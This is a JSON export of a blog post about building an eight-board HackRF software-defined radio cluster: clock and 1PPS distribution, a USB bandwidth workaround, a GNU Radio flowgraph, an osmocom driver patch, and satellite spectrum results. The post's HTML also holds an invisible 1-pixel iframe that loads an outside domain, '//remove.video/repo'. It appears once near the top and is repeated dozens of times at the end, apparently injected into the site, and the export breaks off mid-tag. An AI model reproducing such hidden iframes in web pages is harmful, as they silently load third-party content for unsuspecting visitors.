{"id":2150,"date":"2021-11-29T02:37:18","date_gmt":"2021-11-29T00:37:18","guid":{"rendered":"https:\/\/olegkutkov.me\/?p=2150"},"modified":"2021-11-29T02:37:18","modified_gmt":"2021-11-29T00:37:18","slug":"hackrf-supercluster","status":"publish","type":"post","link":"https:\/\/olegkutkov.me\/2021\/11\/29\/hackrf-supercluster\/","title":{"rendered":"HackRF SuperCluster"},"content":{"rendered":"<p><img loading=\"lazy\" decoding=\"async\" class=\"alignleft size-full wp-image-2151\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/thumb.png\" alt=\"\" width=\"150\" height=\"134\" \/><\/p>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe> Who&#8217;s following me on Twitter probably knows some details. I believe this is my most expected article.<br \/>\nLast year I came up with the idea to build a wideband SDR. It&#8217;s fun to monitor a wider spectrum and some signals.<br \/>\nSure, USRP is cool but too expensive for amateur usage.<br \/>\nI had a few HackRF boards, so I ordered more boards to get 8 in total. Eight HackRF boards could provide up to 160MHz bandwidth.<\/div>\n<div><\/div>\n<div><\/div>\n<p><!--more--><\/p>\n<h3>Project goals<\/h3>\n<p>The original idea is to monitor and research wideband signals, like satellite communications.<br \/>\nSure, I thought about Starlink. But Starlink datastream is 200+ MHz, so my supercluster is not enough.<br \/>\nAnyway, it&#8217;s a great place for experiments and learning new things. Plus, it&#8217;s fun \ud83d\ude42<\/p>\n<h3>Hardware design<\/h3>\n<p>I found that it&#8217;s possible to synchronize multiple HackRF boards. It&#8217;s crucial for signal integrity.<\/p>\n<p>I came up with the following layout:<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8hackrf_layout.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter size-large wp-image-2153\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8hackrf_layout-1024x545.png\" alt=\"\" width=\"850\" height=\"452\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8hackrf_layout-1024x545.png 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8hackrf_layout-400x213.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8hackrf_layout-768x409.png 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8hackrf_layout.png 1081w\" sizes=\"(max-width: 850px) 100vw, 850px\" \/><\/a><\/p>\n<p class=\"_1qeIAgB0cPwnLhDF9XSiJM\">All the boards clocked from the same stable phase-correct 10 MHz sources. Also, there is a 1PPS signal that helps to sync data sampling.<br \/>\nAccording to this <a class=\"_3t5uN8xUmg0TOwRCOGQEcU\" href=\"https:\/\/ieeexplore.ieee.org\/document\/7849328\" target=\"_blank\" rel=\"noopener nofollow ugc\">paper<\/a>, this should provide a decent level of synchronization between the boards.<br \/>\nThis sync mechanism requires the latest HackRF firmware release (at least 2021.03.1). You can find additional details in <a href=\"https:\/\/github.com\/greatscottgadgets\/hackrf\/pull\/381\">this pull request.<\/a><\/p>\n<p class=\"_1qeIAgB0cPwnLhDF9XSiJM\">GPS block it&#8217;s a GPS disciplined oscillator that provides 10 MHz square and 1PPS 1Hz signals.<\/p>\n<p>I was lucky to find two cheap 1&#215;4 splitter <a href=\"https:\/\/www.instockwireless.com\/power_divider_pd1140.htm\">PD1140<\/a>. Also, I had one 1&#215;2 splitter <a href=\"https:\/\/www.minicircuits.com\/WebStore\/dashboard.html?model=ZFSC-2-2500-S%2B\">ZFSC-2-2500-S+<\/a><br \/>\nThus my splitter setup is the following:<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/rf_splitter.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-2156\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/rf_splitter.png\" alt=\"\" width=\"665\" height=\"511\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/rf_splitter.png 800w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/rf_splitter-390x300.png 390w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/rf_splitter-768x590.png 768w\" sizes=\"(max-width: 665px) 100vw, 665px\" \/><\/a><\/p>\n<p class=\"_1qeIAgB0cPwnLhDF9XSiJM\">The total frequencies range is 700MHz &#8211; 2500 MHz. That&#8217;s fine for satellite monitoring. Sure, RF Splitter introduces a lot of fading, so additional LNA is crucial.<\/p>\n<p class=\"_1qeIAgB0cPwnLhDF9XSiJM\">HackRF boards could provide the 10MHz clock output and connect in a daisy chain manner. But this also could introduce delays and phase instability.<br \/>\nI decided to build a separate clock distribution amplifier and provide eight phase-coherent clock lines.<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/08\/front_view.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-2111\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/08\/front_view-1024x573.jpg\" alt=\"\" width=\"691\" height=\"387\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/08\/front_view-1024x573.jpg 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/08\/front_view-400x224.jpg 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/08\/front_view-768x430.jpg 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/08\/front_view.jpg 1500w\" sizes=\"(max-width: 691px) 100vw, 691px\" \/><\/a><\/p>\n<p>You can find all details about this distribution amplifier in my articles:<br \/>\n<a href=\"https:\/\/olegkutkov.me\/2021\/04\/10\/1pps-square-clock-8-channel-distribution-amplifier\/\">https:\/\/olegkutkov.me\/2021\/04\/10\/1pps-square-clock-8-channel-distribution-amplifier\/<\/a><br \/>\n<a href=\"https:\/\/olegkutkov.me\/2021\/08\/19\/housing-for-the-1pps-square-clock-8-channel-distribution-amplifier\/\">https:\/\/olegkutkov.me\/2021\/08\/19\/housing-for-the-1pps-square-clock-8-channel-distribution-amplifier\/<\/a><\/p>\n<div><\/div>\n<div>Connection diagram:<\/div>\n<div><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_1pps_connection.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-2164\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_1pps_connection.png\" alt=\"\" width=\"702\" height=\"498\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_1pps_connection.png 986w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_1pps_connection-400x284.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_1pps_connection-768x544.png 768w\" sizes=\"(max-width: 702px) 100vw, 702px\" \/><\/a><\/div>\n<h3>USB connection<\/h3>\n<p>The most tricky thing was the USB. The problem is that a single HackRF board could create up to 320 MB\/s throughput at 20MHz bandwidth. Eight boards generates 2560 MB\/s of data.<\/p>\n<p>This value is very close to the theoretical maximum of the USB 2.0 interface. This means it&#8217;s impossible to handle two (or more) full-speed data streams with a USB hub due to the same limit of upstream port.<br \/>\nUSB3.0 won&#8217;t help there because a typical USB3.0 hub\/interface couldn&#8217;t convert USB2.0 to USB3.0 with a bandwidth increase.<br \/>\nUSB host-controller is also can&#8217;t handle more than 2 data streams in real-time.<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/usb_bottleneck.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter size-large wp-image-2171\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/usb_bottleneck-1024x254.png\" alt=\"\" width=\"850\" height=\"211\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/usb_bottleneck-1024x254.png 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/usb_bottleneck-400x99.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/usb_bottleneck-768x191.png 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/usb_bottleneck.png 1063w\" sizes=\"(max-width: 850px) 100vw, 850px\" \/><\/a><\/p>\n<p>All of this means delays and dropped data samples. And this is most undesired.<\/p>\n<p>To solve this problem, I decided to install eight separate USB to PCIe host controllers and connect all the controllers to individual PCIe lines of my CPU.<br \/>\n8 PCIe lines provide by a PCIe x16 to 8 PCIe x1 controller board. Typically, such boards are used to connect multiple graphics adapters for crypto mining.<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_usb_solution.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter size-large wp-image-2173\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_usb_solution-1024x494.png\" alt=\"\" width=\"850\" height=\"410\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_usb_solution-1024x494.png 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_usb_solution-400x193.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_usb_solution-768x370.png 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_usb_solution.png 1122w\" sizes=\"(max-width: 850px) 100vw, 850px\" \/><\/a><br \/>\nAnd here is the result. Probably the most weird-looking PC:<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_usb_setup_view.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter size-large wp-image-2175\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_usb_setup_view-1024x442.jpg\" alt=\"\" width=\"850\" height=\"367\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_usb_setup_view-1024x442.jpg 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_usb_setup_view-400x173.jpg 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_usb_setup_view-768x331.jpg 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_usb_setup_view.jpg 1300w\" sizes=\"(max-width: 850px) 100vw, 850px\" \/><\/a><\/p>\n<p>PCIe board installed into the graphics adapter slot for better performance.<br \/>\nSystem specs: CPU is AMD Ryzen 9 3900x, 12 cores\/24 threads. 16 Gb RAM and 256Gb NVME PCIe Gen 3 SSD.<\/p>\n<h3>Software<\/h3>\n<p class=\"_1qeIAgB0cPwnLhDF9XSiJM\">Currently, my software is <a href=\"https:\/\/www.gnuradio.org\/\">gnuradio<\/a>-based. I wrote a script that handles and combines eight signals from my HackRF boards. This process requires data resampling, frequency shifts, and actual combining.<\/p>\n<p>Here is my flowgraph:<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8_hackrf.png\"><img loading=\"lazy\" decoding=\"async\" class=\"size-large wp-image-2178 aligncenter\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8_hackrf-1024x741.png\" alt=\"\" width=\"850\" height=\"615\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8_hackrf-1024x741.png 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8_hackrf-400x289.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8_hackrf-768x556.png 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8_hackrf-1536x1112.png 1536w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8_hackrf-2048x1482.png 2048w\" sizes=\"(max-width: 850px) 100vw, 850px\" \/><\/a><\/p>\n<p style=\"text-align: center;\"><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8_hackrf.png\">Click to get a full-resolution image of the flowgraph.<\/a><\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/8_hackrf.grc_.zip\">Download the flowgraph (wip)<\/a><\/p>\n<p>CorrectIQ fixes the annoying DC-spike issue. I had 8 DC-spikes; this is even worse \ud83d\ude42<br \/>\nYou can get this module here: <a href=\"https:\/\/github.com\/ghostop14\/gr-correctiq\">https:\/\/github.com\/ghostop14\/gr-correctiq<\/a><\/p>\n<p class=\"_1qeIAgB0cPwnLhDF9XSiJM\">I had to patch and rebuild the <a href=\"https:\/\/osmocom.org\/\">osmocom<\/a> source block. Now this block support activation of the external sync signal (1PPS).<\/p>\n<pre class=\"prettyprint\">diff --git a\/lib\/hackrf\/hackrf_common.cc b\/lib\/hackrf\/hackrf_common.cc\nindex 666dc60..a2bc487 100644\n--- a\/lib\/hackrf\/hackrf_common.cc\n+++ b\/lib\/hackrf\/hackrf_common.cc\n@@ -31,8 +31,14 @@ std::mutex hackrf_common::_usage_mutex;\n std::map&lt;std::string, std::weak_ptr&gt; hackrf_common::_devs;\n std::mutex hackrf_common::_devs_mutex;\n \n+typedef enum {\n+  HW_SYNC_MODE_OFF = 0,\n+  HW_SYNC_MODE_ON = 1,\n+} hw_sync_mode_t;\n+\n hackrf_common::hackrf_common(const std::string &amp;args) :\n   _dev(NULL),\n+  _final_serial(\"\"),\n   _sample_rate(0),\n   _center_freq(0),\n   _freq_corr(0),\n@@ -47,7 +53,6 @@ hackrf_common::hackrf_common(const std::string &amp;args) :\n   hackrf_device_list_t *list;\n   int dev_index;\n   std::string target_serial = \"0\";\n-  std::string final_serial = \"\";\n \n   dict_t dict = params_to_dict(args);\n   if (dict.count(\"hackrf\") &gt; 0 &amp;&amp; dict[\"hackrf\"].length() &gt; 0) {\n@@ -99,19 +104,19 @@ hackrf_common::hackrf_common(const std::string &amp;args) :\n   }\n \n   if (list-&gt;serial_numbers[dev_index]) {\n-    final_serial = list-&gt;serial_numbers[dev_index];\n+    _final_serial = list-&gt;serial_numbers[dev_index];\n   }\n \n   {\n     std::lock_guard guard(_devs_mutex);\n \n-    if (_devs.count(final_serial) &gt; 0 &amp;&amp; !_devs[final_serial].expired()) {\n-      _dev = hackrf_sptr(_devs[final_serial]);\n+    if (_devs.count(_final_serial) &gt; 0 &amp;&amp; !_devs[_final_serial].expired()) {\n+      _dev = hackrf_sptr(_devs[_final_serial]);\n     } else {\n       ret = hackrf_device_list_open(list, dev_index, &amp;raw_dev);\n       HACKRF_THROW_ON_ERROR(ret, \"Failed to open HackRF device\")\n       _dev = hackrf_sptr(raw_dev, hackrf_common::close);\n-      _devs[final_serial] = static_cast&lt;std::weak_ptr&gt;(_dev);\n+      _devs[_final_serial] = static_cast&lt;std::weak_ptr&gt;(_dev);\n     }\n   }\n \n@@ -320,6 +325,21 @@ double hackrf_common::get_gain( size_t chan )\n   return _amp_gain;\n }\n \n+int hackrf_common::hw_sync_enable()\n+{\n+  std::cout &lt;&lt; \"Device \" &lt;&lt; _final_serial &lt;&lt; \" enable clk_out\" &lt;&lt; std::endl;\n+  std::cout &lt;&lt; \"Device \" &lt;&lt; _final_serial &lt;&lt; \" set HW_SYNC_MODE_ON\" &lt;&lt; std::endl;\n+\n+  hackrf_set_clkout_enable(_dev.get(), 1);\n+\n+  return hackrf_set_hw_sync_mode(_dev.get(), HW_SYNC_MODE_ON);\n+}\n+\n+int hackrf_common::hw_sync_disable()\n+{\n+  return hackrf_set_hw_sync_mode(_dev.get(), HW_SYNC_MODE_OFF);\n+}\n+\n std::vector&lt; std::string &gt; hackrf_common::get_antennas( size_t chan )\n {\n   return { get_antenna( chan ) };\ndiff --git a\/lib\/hackrf\/hackrf_common.h b\/lib\/hackrf\/hackrf_common.h\nindex d1ab47b..bc8fa43 100644\n--- a\/lib\/hackrf\/hackrf_common.h\n+++ b\/lib\/hackrf\/hackrf_common.h\n@@ -74,6 +74,9 @@ protected:\n   double set_gain( double gain, size_t chan = 0 );\n   double get_gain( size_t chan = 0 );\n \n+  int hw_sync_enable();\n+  int hw_sync_disable();\n+\n   std::vector&lt; std::string &gt; get_antennas( size_t chan = 0 );\n   std::string set_antenna( const std::string &amp; antenna, size_t chan = 0 );\n   std::string get_antenna( size_t chan = 0 );\n@@ -99,6 +102,8 @@ private:\n   static std::map&lt;std::string, std::weak_ptr&gt; _devs;\n   static std::mutex _devs_mutex;\n \n+  std::string _final_serial;\n+\n   double _sample_rate;\n   double _center_freq;\n   double _freq_corr;\ndiff --git a\/lib\/hackrf\/hackrf_source_c.cc b\/lib\/hackrf\/hackrf_source_c.cc\nindex 03ea3bd..f7b97e1 100644\n--- a\/lib\/hackrf\/hackrf_source_c.cc\n+++ b\/lib\/hackrf\/hackrf_source_c.cc\n@@ -450,3 +450,20 @@ osmosdr::freq_range_t hackrf_source_c::get_bandwidth_range( size_t chan )\n {\n   return hackrf_common::get_bandwidth_range(chan);\n }\n+\n+void hackrf_source_c::set_time_source(const std::string &amp;source, const size_t mboard)\n+{\n+   std::cout &lt;&lt; \"hackrf_source_c::set_time_source = \" &lt;&lt; source &lt;&lt; std::endl;\n+\n+   if (source == \"external\") {\n+       hackrf_common::hw_sync_enable();\n+   } else {\n+       hackrf_common::hw_sync_disable();\n+   }\n+}\n+\n+std::string hackrf_source_c::get_time_source(const size_t mboard)\n+{\n+   return \"\";\n+}\n+\ndiff --git a\/lib\/hackrf\/hackrf_source_c.h b\/lib\/hackrf\/hackrf_source_c.h\nindex 0d38ac0..ba8ed80 100644\n--- a\/lib\/hackrf\/hackrf_source_c.h\n+++ b\/lib\/hackrf\/hackrf_source_c.h\n@@ -119,6 +119,9 @@ public:\n   double get_bandwidth( size_t chan = 0 );\n   osmosdr::freq_range_t get_bandwidth_range( size_t chan = 0 );\n \n+  void set_time_source(const std::string &amp;source, const size_t mboard = 0);\n+  std::string get_time_source(const size_t mboard);\n+\n private:\n   static int _hackrf_rx_callback(hackrf_transfer* transfer);\n   int hackrf_rx_callback(unsigned char *buf, uint32_t len);\n<\/pre>\n<p>After the block installation, it&#8217;s possible to select &#8220;MBx: Time Source&#8221; &#8211;&gt; &#8220;External&#8221;. Where &#8220;x&#8221; it&#8217;s the radio number (0-8).<br \/>\nThis option activates HackRF 1PPS sync input.<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/osmocom_ext_clock_opt.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-2189\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/osmocom_ext_clock_opt.png\" alt=\"\" width=\"516\" height=\"454\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/osmocom_ext_clock_opt.png 622w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/osmocom_ext_clock_opt-341x300.png 341w\" sizes=\"(max-width: 516px) 100vw, 516px\" \/><\/a><\/p>\n<p>Sure, this flowgraph is resource-hungry and does not work smoothly, even on my Ryzen 9 CPU. That&#8217;s why I&#8217;m slowly rewriting all this to C++.<\/p>\n<p>The general idea is to isolate 8 CPU cores and assign interrupts and basic flow processing for each <a href=\"https:\/\/www.linuxtopia.org\/online_books\/linux_kernel\/kernel_configuration\/re46.html\">isolated<\/a> CPU core.<br \/>\nLeft cores would run generic threads, UI interface, and so on.<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluser_cpu_sched_idea.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-2196\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluser_cpu_sched_idea-1024x313.png\" alt=\"\" width=\"762\" height=\"233\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluser_cpu_sched_idea-1024x313.png 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluser_cpu_sched_idea-400x122.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluser_cpu_sched_idea-768x235.png 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluser_cpu_sched_idea.png 1076w\" sizes=\"(max-width: 762px) 100vw, 762px\" \/><\/a><br \/>\nI believe this should provide the best performance.<\/p>\n<h3>Results<\/h3>\n<p>Currently, I&#8217;m working with Ku-band satellites signals.<br \/>\nMy setup contains two amplifiers and a <a href=\"https:\/\/www.minicircuits.com\/WebStore\/dashboard.html?model=SHP-800%2B\">high-pass<\/a> filter. My <a href=\"https:\/\/olegkutkov.me\/2020\/12\/15\/satellite-lnb-controller-with-gui-interface\/\">Satellite LNB controller<\/a> controls the antenna LNB.<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_sc_27_11_2021_small.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter size-full wp-image-2200\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_sc_27_11_2021_small.jpg\" alt=\"\" width=\"900\" height=\"600\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_sc_27_11_2021_small.jpg 900w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_sc_27_11_2021_small-400x267.jpg 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_sc_27_11_2021_small-768x512.jpg 768w\" sizes=\"(max-width: 900px) 100vw, 900px\" \/><\/a><\/p>\n<p class=\"_1qeIAgB0cPwnLhDF9XSiJM\">Resulting spectrum at 12.38 GHz. Two DVB-S transponders are visible:<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_running_spectrum_small.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-2202\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_running_spectrum_small.png\" alt=\"\" width=\"773\" height=\"457\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_running_spectrum_small.png 900w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_running_spectrum_small-400x236.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_running_spectrum_small-768x454.png 768w\" sizes=\"(max-width: 773px) 100vw, 773px\" \/><\/a><\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_running_waterfall_small.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-2201\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_running_waterfall_small.png\" alt=\"\" width=\"773\" height=\"455\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_running_waterfall_small.png 900w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_running_waterfall_small-400x236.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/hackrf_supercluster_running_waterfall_small-768x452.png 768w\" sizes=\"(max-width: 773px) 100vw, 773px\" \/><\/a><\/p>\n<p class=\"_1qeIAgB0cPwnLhDF9XSiJM\">The raw recording could be &#8220;played&#8221; with GQRX:<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/gqrx_160mhz_1_small.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-2203\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/gqrx_160mhz_1_small.png\" alt=\"\" width=\"658\" height=\"445\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/gqrx_160mhz_1_small.png 900w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/gqrx_160mhz_1_small-400x271.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/11\/gqrx_160mhz_1_small-768x520.png 768w\" sizes=\"(max-width: 658px) 100vw, 658px\" \/><\/a><\/p>\n<p>Is it possible to demodulate the signal? Nope.<br \/>\nThe main problem is that this is not a real continuous spectrum. I had to use some frequency overlaps to avoid &#8220;gaps&#8221;. Those gaps are the results of the upsampling process.<br \/>\nPlus, there might be some frequency instabilities; I need to do some additional measurements.<\/p>\n<p>Honestly, I don&#8217;t know how I&#8217;m to work around this &#8220;gaps issue&#8221;. Not sure if it&#8217;s even possible, but work continues.<\/p>\n<p>Thanks for reading!<\/p>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" 